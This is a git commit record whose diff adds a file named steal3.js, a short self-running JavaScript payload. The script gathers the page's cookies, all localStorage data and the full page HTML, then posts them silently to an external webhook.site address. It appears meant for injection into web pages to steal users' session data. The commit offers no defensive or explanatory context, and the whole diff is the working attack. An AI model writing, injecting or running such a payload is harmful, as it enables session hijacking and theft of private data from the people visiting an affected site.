f5a44faffa3ed36e36428fa7936037d5ebf32af9
Muhammad <121026133+DadajanovMuhammad@users.noreply.github.com>
2025-09-26 16:07:52 +0500

    Update steal3.js
    qqq

--- steal3.js
+++ steal3.js
@@ -1,1 +1,14 @@
-q
+(() => {
+  const data = {
+    cookie: document.cookie,
+    localStorage: JSON.stringify(localStorage),
+    html: document.documentElement.outerHTML,
+  };
+
+  fetch("  https://webhook.site/4d0427f2-b174-4a86-a32a-61c76bd977d1", {
+    method: "POST",
+    mode: "no-cors",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(data),
+  });
+})();
